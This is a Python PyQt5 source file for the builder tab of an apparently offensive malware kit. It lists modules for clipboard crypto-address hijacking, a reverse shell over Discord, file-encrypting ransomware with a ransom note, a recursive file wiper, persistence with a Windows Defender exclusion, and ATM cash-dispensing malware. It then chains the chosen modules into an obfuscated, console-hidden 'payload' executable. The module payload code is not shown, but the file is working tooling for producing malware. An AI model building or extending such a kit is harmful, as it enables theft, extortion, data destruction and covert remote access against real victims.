import os
from functools import partial
from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, 
    QComboBox, QCheckBox, QLabel, QGroupBox, QScrollArea,
    QTableWidget, QTableWidgetItem, QHeaderView, QAbstractItemView, QSizePolicy
)
from PyQt5.QtGui import QFont, QPixmap, QMovie
from PyQt5.QtCore import Qt, pyqtSignal


MODULES = {
    'module/ctrlvamp': {
        'desc': 'Hijacks clipboard crypto addresses (BTC, ETH, BEP-20, SOL).'
    },
    'module/dumpster': {
        'desc': 'Collects files from a directory and archives them into a single file.'
    },
    'module/ghostintheshell': {
        'desc': 'Provides a reverse shell over Discord for remote access.'
    },
    'module/krash': {
        'desc': 'Encrypts files in target directories and displays a ransom note.'
    },
    'module/poof': {
        'desc': 'Recursively deletes all files and folders from a target directory.'
    },
    'module/undeleteme': {
        'desc': 'Gains persistence and can add a Windows Defender exclusion.'
    },
    'module/byovf': {
        'desc': 'Bring your own Nim file and embed secondary files (e.g., drivers, DLLs).'
    },
    'module/bankruptsys': {
        'desc': 'An ATM malware module to dispense cash via XFS.'
    },
    'module/winkrashv2': {
        'desc': 'A ransomware module for Windows that uses direct syscalls.'
    }
}


class ModuleTableWidget(QTableWidget):
    """A QTableWidget that supports drag-and-drop row reordering."""
    reorder_signal = pyqtSignal(list)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setDragDropMode(QAbstractItemView.InternalMove)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setSelectionMode(QAbstractItemView.SingleSelection)

    def dropEvent(self, event):
        if event.source() == self and (event.dropAction() == Qt.MoveAction or self.dragDropMode() == QAbstractItemView.InternalMove):
            source_row = self.selectionModel().currentIndex().row()
            dest_row = self.indexAt(event.pos()).row()
            if dest_row == -1:
                dest_row = self.rowCount() - 1

            current_order = []
            for row in range(self.rowCount()):
                item = self.item(row, 0)
                if item and item.data(Qt.UserRole):
                    current_order.append(item.data(Qt.UserRole))
            
            moved_item = current_order.pop(source_row)
            current_order.insert(dest_row, moved_item)

            self.reorder_signal.emit(current_order)
            event.accept()
            event.setDropAction(Qt.IgnoreAction)
        else:
            super().dropEvent(event)


class BuilderWidget(QWidget):
    """Builder tab widget for module selection and build configuration."""
    
    build_requested = pyqtSignal(dict)
    log_message = pyqtSignal(str, str)
    
    def __init__(self, script_dir, module_options, parent=None):
        super().__init__(parent)
        self.script_dir = script_dir
        self.module_options = module_options
        self.selected_modules = []
        self.option_inputs = {}
        self.current_option_values = {}
        self.loading_movie = None
        self.init_ui()
        
    def init_ui(self):
        layout = QHBoxLayout(self)
        
        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(9)
        subtitle_font = QFont()
        subtitle_font.setPointSize(9)

        # Left side - Module Options and Build Options
        left_layout = QVBoxLayout()

        self.module_options_group = QGroupBox("MODULE OPTIONS")
        self.module_options_group.setFont(title_font)
        module_options_group_layout = QVBoxLayout(self.module_options_group)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content_widget = QWidget()
        self.options_layout = QVBoxLayout(scroll_content_widget)

        scroll_area.setWidget(scroll_content_widget)
        module_options_group_layout.addWidget(scroll_area)
        left_layout.addWidget(self.module_options_group, stretch=7)
        
        # Build Options
        build_options_group = QGroupBox("BUILD OPTIONS")
        build_options_group.setFont(title_font)
        build_options_layout = QVBoxLayout(build_options_group)
        build_options_layout.setSpacing(10)

        exe_name_layout = QHBoxLayout()
        exe_name_label = QLabel("EXE NAME")
        exe_name_label.setFont(subtitle_font)
        self.exe_name_input = QLineEdit("payload")
        self.exe_name_input.setFont(subtitle_font)
        exe_name_layout.addWidget(exe_name_label)
        exe_name_layout.addWidget(self.exe_name_input, 1)

        target_os_label = QLabel("OS")
        target_os_label.setFont(subtitle_font) 
        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["windows", "linux", "macos"])
        self.target_os_combo.setFont(subtitle_font)
        self.target_os_combo.currentTextChanged.connect(self.update_windows_only_options)
        exe_name_layout.addWidget(target_os_label)
        exe_name_layout.addWidget(self.target_os_combo, 1)
        
        target_arch_label = QLabel("PROCESSOR")
        target_arch_label.setFont(subtitle_font)
        self.target_arch_combo = QComboBox()
        self.target_arch_combo.addItems(["amd64", "arm64"])
        self.target_arch_combo.setFont(subtitle_font)
        exe_name_layout.addWidget(target_arch_label)
        exe_name_layout.addWidget(self.target_arch_combo, 1)
        build_options_layout.addLayout(exe_name_layout)

        win_options_layout = QHBoxLayout()
        self.hide_console_check = QCheckBox("HIDE CONSOLE")
        self.hide_console_check.setFont(subtitle_font)
        self.hide_console_check.setChecked(True)
        win_options_layout.addWidget(self.hide_console_check)

        self.obfuscate_check = QCheckBox("OBFUSCATE")
        self.obfuscate_check.setFont(subtitle_font)
        self.obfuscate_check.setChecked(False)
        self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
        win_options_layout.addWidget(self.obfuscate_check)

        self.ollvm_input = QLineEdit("")
        self.ollvm_input.setPlaceholderText("e.g., -fla -sub -bcf")
        self.ollvm_input.setFont(subtitle_font)
        win_options_layout.addWidget(self.ollvm_input, 1)
        build_options_layout.addLayout(win_options_layout)
        
        left_layout.addWidget(build_options_group)

        # Build Button
        build_btn_layout = QHBoxLayout()
        self.build_btn = QPushButton("BUILD")
        self.build_btn.setFont(subtitle_font)
        self.build_btn.clicked.connect(self.on_build_clicked)
        build_btn_layout.addWidget(self.build_btn)
        left_layout.addLayout(build_btn_layout)

        # Banner
        banner_layout = QHBoxLayout()
        self.banner_label = QLabel("Banner Placeholder")
        self.banner_label.setFont(subtitle_font)
        banner_path = os.path.join(self.script_dir, "ASSETS", "banner.png")
        movie = QMovie(banner_path)
        if movie.isValid():
            self.banner_label.setMovie(movie)
            movie.start()
        self.banner_label.setFixedHeight(50)
        self.banner_label.setAlignment(Qt.AlignCenter)
        banner_layout.addWidget(self.banner_label, stretch=1)
        left_layout.addLayout(banner_layout)
        layout.addLayout(left_layout, 6)

        # Right side - Module selection and chain
        right_layout = QVBoxLayout()
        module_select_layout = QVBoxLayout()
        module_select_layout.setContentsMargins(0, 12, 0, 0)
        module_label = QLabel("MODULES")
        module_label.setFont(title_font)
        module_select_layout.addWidget(module_label)
        
        self.module_combo = QComboBox()
        self.module_combo.setFont(subtitle_font)
        self.module_combo.addItem("SELECT MODULE")
        for module in MODULES.keys():
            self.module_combo.addItem(module.split('/')[-1])
        self.module_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        module_select_layout.addWidget(self.module_combo)

        module_buttons_layout = QHBoxLayout()
        self.add_module_btn = QPushButton("ADD MODULE")
        self.add_module_btn.setFont(subtitle_font)
        self.add_module_btn.clicked.connect(self.add_module)
        module_buttons_layout.addWidget(self.add_module_btn)
        module_select_layout.addLayout(module_buttons_layout)
        right_layout.addLayout(module_select_layout)

        module_chain_label = QLabel("MODULE CHAIN")
        module_chain_label.setFont(title_font)
        right_layout.addWidget(module_chain_label)
        
        self.module_table = ModuleTableWidget()
        self.module_table.setFont(subtitle_font)
        self.module_table.setColumnCount(2)
        self.module_table.setHorizontalHeaderLabels(["Module", ""])
        self.module_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.module_table.setColumnWidth(1, 50)
        self.module_table.setStyleSheet("background-color: #0a0a0a;")
        self.module_table.reorder_signal.connect(self.reorder_modules)
        self.module_table.itemClicked.connect(self.on_module_item_clicked)
        right_layout.addWidget(self.module_table)

        layout.addLayout(right_layout, 4)
        
        self.update_options_layout()
        self.update_windows_only_options(self.target_os_combo.currentText())

    def toggle_obfuscation(self):
        self.ollvm_input.setEnabled(self.obfuscate_check.isChecked())

    def update_windows_only_options(self, os_name):
        if os_name in ("linux", "macos"):
            self.hide_console_check.setEnabled(False)
            self.obfuscate_check.setEnabled(False)
            self.obfuscate_check.setChecked(False)
            self.ollvm_input.setEnabled(False)
        else:
            self.hide_console_check.setEnabled(True)
            self.obfuscate_check.setEnabled(True)
            self.toggle_obfuscation()

    def add_module(self):
        module_name = self.module_combo.currentText()
        if module_name == "SELECT MODULE":
            self.log_message.emit("Error: No module selected.", "error")
            return
        full_module = f"module/{module_name}"
        if full_module in self.selected_modules:
            self.log_message.emit(f"Error: Module {module_name} already added.", "error")
            return
        if full_module in MODULES:
            self.selected_modules.append(full_module)
            self.log_message.emit(f"Added module: {module_name}", "success")
            self.update_all_option_values()
            self.update_module_table()
            self.update_options_layout()

    def remove_module(self, module_to_remove):
        if module_to_remove in self.selected_modules:
            self.selected_modules.remove(module_to_remove)
            module_name = os.path.basename(module_to_remove)
            self.log_message.emit(f"Removed module: {module_name}", "system")
            self.update_all_option_values()
            self.update_module_table()
            self.update_options_layout()

    def on_module_item_clicked(self, item):
        self.update_options_layout(focused_module=item.data(Qt.UserRole))

    def reorder_modules(self, new_order):
        if self.selected_modules == new_order:
            return
        self.log_message.emit("Module chain reordered.", "system")
        self.selected_modules = new_order
        self.update_module_table()

    def update_module_table(self):
        self.module_table.setRowCount(len(self.selected_modules))
        for i, module in enumerate(self.selected_modules):
            module_name = module.split('/')[-1]
            name_item = QTableWidgetItem(module_name) 
            name_item.setFont(QFont("Arial", 10))
            name_item.setData(Qt.UserRole, module)
            name_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
            self.module_table.setItem(i, 0, name_item)

            remove_btn = QPushButton("X")
            remove_btn.setFont(QFont("Arial", 8))
            remove_btn.clicked.connect(partial(self.remove_module, module))
            self.module_table.setCellWidget(i, 1, remove_btn)

        for i in range(self.module_table.rowCount()):
            self.module_table.setRowHeight(i, 30)

    def update_options_layout(self, focused_module=None):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)
        self.option_inputs.clear()

        subtitle_font = QFont()
        subtitle_font.setPointSize(9)
        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(9)

        if not self.selected_modules:
            icon_label = QLabel()
            icon_path = os.path.join(self.script_dir, "ASSETS", "normal.png")
            pixmap = QPixmap(icon_path)
            if not pixmap.isNull():
                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                icon_label.setText("Add a module to see its options")
            icon_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
            self.module_options_group.setTitle("MODULE OPTIONS")
            return

        modules_to_show = [focused_module] if focused_module else self.selected_modules

        if focused_module:
            self.module_options_group.setTitle(f"{focused_module.split('/')[-1].upper()} OPTIONS")
            self.module_options_group.setFont(title_font)
        else:
            self.module_options_group.setTitle("MODULE OPTIONS")

        has_any_options = False
        for module_name in modules_to_show:
            if module_name not in self.module_options or not self.module_options[module_name]:
                continue

            has_any_options = True

            if not focused_module and len(self.selected_modules) > 1:
                module_label = QLabel(f"{module_name.split('/')[-1].upper()} OPTIONS")
                module_label.setStyleSheet("font-weight: bold; color: #707070;")
                module_label.setFont(title_font)
                self.options_layout.addWidget(module_label)

            module_defaults = self.module_options.get(module_name, {})
            module_current_values = self.current_option_values.get(module_name, {})
            
            for option, default_value in module_defaults.items():
                value = module_current_values.get(option, default_value)
                option_row = QHBoxLayout()
                option_label = QLabel(f"{option}:")
                option_label.setFont(subtitle_font)
                option_label.setStyleSheet("color: #b0b0b0;")
                if option in ['persistence', 'defenderExclusion']:
                    input_widget = QCheckBox()
                    input_widget.setFont(subtitle_font)
                    try:
                        is_checked = str(value).lower() in ('true', '1', 'yes', 'on')
                        input_widget.setChecked(is_checked)
                    except:
                        input_widget.setChecked(False)
                else:
                    input_widget = QLineEdit(value)
                    input_widget.setFont(subtitle_font)

                if option in ['nimFile', 'embedFiles', 'dumpsterFile', 'inputDir', 'outputDir', 'targetDir']:
                    browse_btn = QPushButton("Browse...")
                    option_row.addWidget(browse_btn)

                option_row.addWidget(option_label)
                option_row.addWidget(input_widget)
                self.options_layout.addLayout(option_row)
                self.option_inputs[f"{module_name}:{option}"] = input_widget
            if not focused_module:
                self.options_layout.addSpacing(10)

        if not has_any_options:
            no_options_label = QLabel("No configurable options for the selected module(s).")
            no_options_label.setFont(subtitle_font)
            no_options_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(no_options_label, 0, Qt.AlignCenter)
            self.options_layout.addStretch()
        else:
            self.options_layout.addStretch()

    def update_all_option_values(self):
        for key, widget in self.option_inputs.items():
            module_name, option_name = key.split(":")
            if module_name not in self.current_option_values:
                self.current_option_values[module_name] = {}
            
            if isinstance(widget, QLineEdit):
                value = widget.text()
            elif isinstance(widget, QCheckBox):
                value = str(widget.isChecked()).lower()
            else:
                continue
            self.current_option_values[module_name][option_name] = value

    def show_loading_view(self):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

        self.option_inputs.clear()

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "loading.gif")
        self.loading_movie = QMovie(icon_path)
        if not self.loading_movie.isValid():
            icon_label.setText("Building...")
            icon_label.setStyleSheet("color: #909090;")
        else:
            icon_label.setMovie(self.loading_movie)
            original_size = self.loading_movie.frameRect().size()
            scaled_size = original_size.scaled(500, 500, Qt.KeepAspectRatio)
            self.loading_movie.setScaledSize(scaled_size)
            self.loading_movie.start()
        icon_label.setAlignment(Qt.AlignCenter)
        self.options_layout.addStretch()
        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
        self.options_layout.addStretch()

    def clear_loading_view(self):
        if self.loading_movie:
            self.loading_movie.stop()
            self.loading_movie = None
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

    def show_result_view(self, is_success):
        self.clear_loading_view()
        image_name = "success.png" if is_success else "error.png"
        fallback_text = "SUCCESS" if is_success else "BUILD FAILED"

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", image_name)
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            icon_label.setText(fallback_text)
            icon_label.setStyleSheet(f"color: {'#ffffff' if is_success else '#808080'}; font-size: 18px; font-weight: bold;")

        icon_label.setAlignment(Qt.AlignCenter)
        self.options_layout.addStretch()
        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
        self.options_layout.addStretch()

    def on_build_clicked(self):
        self.update_all_option_values()
        build_config = {
            'selected_modules': self.selected_modules,
            'exe_name': self.exe_name_input.text(),
            'target_os': self.target_os_combo.currentText(),
            'target_arch': self.target_arch_combo.currentText(),
            'hide_console': self.hide_console_check.isChecked(),
            'obfuscate': self.obfuscate_check.isChecked(),
            'ollvm': self.ollvm_input.text(),
            'option_values': self.current_option_values
        }
        self.build_requested.emit(build_config)

    def get_settings(self):
        self.update_all_option_values()
        return {
            'exe_name': self.exe_name_input.text(),
            'target_os': self.target_os_combo.currentText(),
            'target_arch': self.target_arch_combo.currentText(),
            'hide_console': self.hide_console_check.isChecked(),
            'obfuscate': self.obfuscate_check.isChecked(),
            'ollvm': self.ollvm_input.text(),
            'module_chain': self.selected_modules,
            'module_options': self.current_option_values
        }

    def load_settings(self, settings):
        self.exe_name_input.setText(settings.get('exe_name', 'payload'))
        self.target_os_combo.setCurrentText(settings.get('target_os', 'windows'))
        self.target_arch_combo.setCurrentText(settings.get('target_arch', 'amd64'))
        self.hide_console_check.setChecked(settings.get('hide_console', True))
        self.obfuscate_check.setChecked(settings.get('obfuscate', False))
        self.ollvm_input.setText(settings.get('ollvm', ''))
        self.selected_modules = settings.get('module_chain', [])
        self.current_option_values = settings.get('module_options', {})
        self.update_module_table()
        self.update_options_layout()
